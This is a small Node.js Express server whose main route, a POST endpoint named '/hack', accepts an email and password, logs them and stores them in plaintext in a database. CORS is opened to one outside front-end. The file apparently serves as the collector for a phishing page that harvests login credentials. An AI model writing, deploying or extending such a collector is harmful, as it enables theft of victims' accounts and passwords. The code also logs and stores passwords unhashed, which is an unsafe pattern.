const express = require("express");
const app = express();
const port = 5000;
const mongodb = require("./server");
const db =require("./schema");
app.get("/", (req, res) => {
  res.send("Hello world");
});
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://ig-m7pu.onrender.com");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

app.use(express.json());
app.post('/hack',async (req,res)=>{
        try{
          console.log(req.body);
        await db.create({
            email:req.body.email,
            password:req.body.password
        }).then(()=>{
          console.log(req.body)
            res.json({success:true}) 
        })
        }
        catch(error){
          console.log(error.message);
          res.send("server error",String(error.message))
        }
})
app.listen(port, () => {
  console.log(`app is listning on port ${port}`);
});
